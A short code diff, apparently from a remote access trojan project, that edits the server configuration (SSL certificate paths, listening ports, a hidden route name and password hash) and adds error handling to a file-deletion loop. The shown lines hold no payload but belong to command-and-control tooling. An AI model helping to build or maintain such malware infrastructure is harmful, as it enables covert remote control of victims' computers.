@@ -30,8 +30,8 @@ HOST = '0.0.0.0'
 PORT = 8765
 WEB_HOST = '0.0.0.0'
 WEB_PORT = 5000
-SSL_CERT = '/home/zhaobokai/vscode/remote_access_trojan/code/cert.pem' 
-SSL_KEY = '/home/zhaobokai/vscode/remote_access_trojan/code/key.pem'
+SSL_CERT = '../../cert.pem' 
+SSL_KEY = '../../key.pem'
 SECURITY_PATH = 'fuck'
 SECURITY_PASSWORD_HASH = b'$2b$04$T8NZ.WUIuO05WyVpLrQYiOdgqc2zbx7E9ysF03696dYvwGohCFzwC'
 
@@ -214,11 +214,15 @@ async def robots():
 async def clean_download_file():
     global delete_file
     while True:
-        if delete_file != "":
-            os.remove(f"download/{delete_file}")
-            logging.info(f"{lp.g("download_file_deleted")}: {delete_file}")
-            delete_file = ""
-        await asyncio.sleep(0.1)
+        try:
+            # 为了解决Windows文件占用问题
+            if delete_file != "":
+                os.remove(f"download/{delete_file}")
+                logging.info(f"{lp.g("download_file_deleted")}: {delete_file}")
+                delete_file = ""
+        except Exception as e:
+            logging.info(f"{lp.g("download_file_delete_failed")}: {e}")
+        await asyncio.sleep(5)
 
 # 密码验证路由
 @app.route(f"/{SECURITY_PATH}/verify", methods=['POST'])
